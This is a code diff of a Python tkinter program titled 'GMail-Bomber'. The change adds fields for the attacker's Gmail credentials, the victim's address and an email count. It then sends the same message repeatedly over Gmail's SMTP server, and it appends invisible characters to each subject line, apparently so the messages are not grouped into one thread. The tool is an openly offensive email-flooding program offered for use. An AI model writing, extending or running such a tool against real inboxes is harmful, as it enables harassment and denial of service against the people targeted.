@@ -1,8 +1,6 @@
-import atexit
 import binascii
 import smtplib
 from email.message import EmailMessage
-from options import BomberOptions
 from res.icon import runtime_icon
 import tkinter as tk
 import tempfile
@@ -19,50 +17,125 @@ port = 587
 # User interface
 #
 
-def on_closing(iconfile):
-    try:
-        os.remove(iconfile.name)
-    except Exception:
-        pass
-
 def create_gui() -> tk.Tk:
+    global txt_attacker_name
+    global txt_attacker_address
+    global txt_attacker_password
+    global txt_victim_address
+    global txt_email_amount
+    global txt_email_subject
+    global txt_email_body
+    global txt_output
+    
     root = tk.Tk()
    
-    root.geometry("400x400")
+    root.geometry('400x400')
     root.resizable(0, 0)
-    root.title("GMail-Bomber")
+    root.title('GMail-Bomber')
     root.configure(background = 'black')
+    root.wm_attributes('-topmost', 1)
     
     iconfile = tempfile.NamedTemporaryFile(delete = False)
     iconfile.write(binascii.a2b_hex(runtime_icon.iconhexdata))
-    atexit.register(lambda file = iconfile: on_closing(runtime_icon.iconhexdata))
-    
     root.iconbitmap(iconfile.name)
-   
-    lbl_victim_address = tk.Label(root, text = 'Victim\'s address: ', bg = 'black', fg = 'white')
-    lbl_victim_address.place(x = 10, y = 15)
+    root.protocol('WM_DELETE_WINDOW', lambda args = iconfile.name: on_closing(args))
     
-    txt_victim_address = tk.Text(root, bg = 'black', fg = 'white', width = 30, height = 1, insertbackground = 'white')
-    txt_victim_address.place(x = 140, y = 15)
+    lbl_attacker_name = tk.Label(root, text = 'Attacker\'s name: ', bg = 'black', fg = 'white')
+    lbl_attacker_name.place(x = 10, y = 15)
+    txt_attacker_name = tk.Text(root, bg = 'black', fg = 'white', width = 35, height = 1, insertbackground = 'white', font = ('Arial', 9))
+    txt_attacker_name.place(x = 140, y = 15)
+    
+    lbl_attacker_address = tk.Label(root, text = 'Attacker\'s address: ', bg = 'black', fg = 'white')
+    lbl_attacker_address.place(x = 10, y = 40)
+    txt_attacker_address = tk.Text(root, bg = 'black', fg = 'white', width = 35, height = 1, insertbackground = 'white', font = ('Arial', 9))
+    txt_attacker_address.place(x = 140, y = 40)
+    
+    lbl_attacker_password = tk.Label(root, text = 'Attacker\'s password: ', bg = 'black', fg = 'white')
+    lbl_attacker_password.place(x = 10, y = 65)
+    txt_attacker_password = tk.Entry(root, bg = 'black', fg = 'white', width = 41, insertbackground = 'white', show = '*')
+    txt_attacker_password.place(x = 140, y = 65)
+    
+    lbl_victim_address = tk.Label(root, text = 'Victim\'s address: ', bg = 'black', fg = 'white')
+    lbl_victim_address.place(x = 10, y = 90)
+    txt_victim_address = tk.Text(root, bg = 'black', fg = 'white', width = 35, height = 1, insertbackground = 'white', font = ('Arial', 9))
+    txt_victim_address.place(x = 140, y = 90)
+    
+    lbl_email_amount = tk.Label(root, text = 'Email amount: ', bg = 'black', fg = 'white')
+    lbl_email_amount.place(x = 10, y = 115)
+    txt_email_amount = tk.Text(root, bg = 'black', fg = 'white', width = 35, height = 1, insertbackground = 'white', font = ('Arial', 9))
+    txt_email_amount.place(x = 140, y = 115)
+    
+    lbl_email_subject = tk.Label(root, text = 'Email subject: ', bg = 'black', fg = 'white')
+    lbl_email_subject.place(x = 10, y = 140)
+    txt_email_subject = tk.Text(root, bg = 'black', fg = 'white', width = 35, height = 1, insertbackground = 'white', font = ('Arial', 9))
+    txt_email_subject.place(x = 140, y = 140)
+    
+    lbl_email_body = tk.Label(root, text = 'Email body: ', bg = 'black', fg = 'white')
+    lbl_email_body.place(x = 10, y = 165)
+    txt_email_body = tk.Text(root, bg = 'black', fg = 'white', width = 35, height = 5, insertbackground = 'white', font = ('Arial', 9))
+    txt_email_body.place(x = 140, y = 165)
+    
+    btn_save_fields = tk.Button(root, text = 'Save fields', bg = 'black', fg = 'white', width = 15, command = save_fields)
+    btn_save_fields.place(x = 20, y = 270)
+    
+    btn_load_fields = tk.Button(root, text = 'Load field', bg = 'black', fg = 'white', width = 15, command = load_fields)
+    btn_load_fields.place(x = 140, y = 270)
+    
+    btn_send_mails = tk.Button(root, text = '>> Send <<', bg = 'black', fg = 'white', width = 15, command = send_emails)
+    btn_send_mails.place(x = 260, y = 270)
+    
+    sep_seperator = tk.Frame(root, bg = 'white', width = 400, height = 1)
+    sep_seperator.place(x = 0, y = 305)
+    
+    txt_output = tk.Text(root, bg = 'black', fg = 'white', width = 65, height = 6, insertbackground = 'white', wrap = 'none', state = 'disabled', font = ('Arial', 8))
+    txt_output.place(x = 3, y = 310)
+    
+    txt_output.tag_configure('white', background = 'black', foreground = 'white')
+    txt_output.tag_configure('green', background = 'black', foreground = 'green')
+    txt_output.tag_configure('yellow', background = 'black', foreground = 'yellow')
+    txt_output.tag_configure('red', background = 'black', foreground = 'red')
     
     return root
+
+#
+# Helper methods
+#
+
+def on_closing(iconfile_path: str):
+    try:
+        os.remove(iconfile_path)
+    except Exception as e:
+        print(e)
+    exit(0)
+
+def save_fields() -> None:
+    print_text('> Saved all fields')
+
+def load_fields() -> None:
+    print_text('> Loaded all fields')
+
+def print_text(text: str, tag_color: str = 'white') -> None:
+    txt_output.configure(state = 'normal')
+    txt_output.insert('end', text + '\n', tag_color)
+    txt_output.configure(state = 'disabled')
+    txt_output.see('end')
 
 #
 # Main methods
 #
 
-def create_message(options: BomberOptions) -> EmailMessage:
+def create_message(i: int) -> EmailMessage:
     
     # Create email
     msg = EmailMessage()
-    msg['Subject'] = options.email_subject
-    msg['From'] = f'{options.attacker_anonymous_name} <{options.attacker_gmail_address}>'
-    msg['To'] = options.victim_address
-    msg.set_content(options.email_body)
+    msg['Subject'] = txt_email_subject.get('1.0', 'end-1c') + (u'\u200e' * i)
+    msg['From'] = f'{txt_attacker_name.get("1.0", "end-1c")} <{txt_attacker_address.get("1.0", "end-1c")}>'
+    msg['To'] = txt_victim_address.get('1.0', 'end-1c')
+    msg.set_content(txt_email_body.get('1.0', 'end-1c'))
     
     return msg
 
-def server_login(options: BomberOptions) -> smtplib.SMTP:
+def server_login() -> smtplib.SMTP:
     
     # Create smtp server
     server = smtplib.SMTP(smtp_server, port)
@@ -72,29 +145,29 @@ def server_login(options: BomberOptions) -> smtplib.SMTP:
     
     # Try to login
     try:
-        server.login(options.attacker_gmail_address, options.attacker_gmail_password)
+        server.login(txt_attacker_address.get("1.0", "end-1c"), txt_attacker_password.get("1.0", "end-1c"))
     except smtplib.SMTPAuthenticationError:
-        raise ValueError('The password doesn\'t match the email or you don\'t have access enabled by less secure apps on Google')
+        return None
     
     return server
 
-def send_emails(options: BomberOptions) -> None:
-    email_server = server_login(options)
-    email_message = create_message(options)
+def send_emails() -> None:
+    email_server = server_login()
+    if not email_server:
+        print_text('> The password doesn\'t match the email or you didn\'t setup your account correctly. \nCheck this video for help: https://youtu.be/g_j6ILT-X0k', 'red')
+        return
     
-    for i in range(options.email_amount):
+    for i in range(int(txt_email_amount.get('1.0', 'end-1c'))):
+        email_message = create_message(i)
         email_server.send_message(email_message)
-        print(f'Sent email number {i + 1}')
+        print_text(f'> Sent email number {i + 1}', 'white')
+    
     email_server.quit()
-    print('Emails have been sent successfully')
+    print_text('> Emails have been sent successfully', 'green')
 
-def main() -> None:
-    options = BomberOptions()
-   
+def main() -> None:   
     gui = create_gui()
     gui.mainloop()
-   
-   #send_emails(options)
 
 if __name__ == '__main__':
     main()
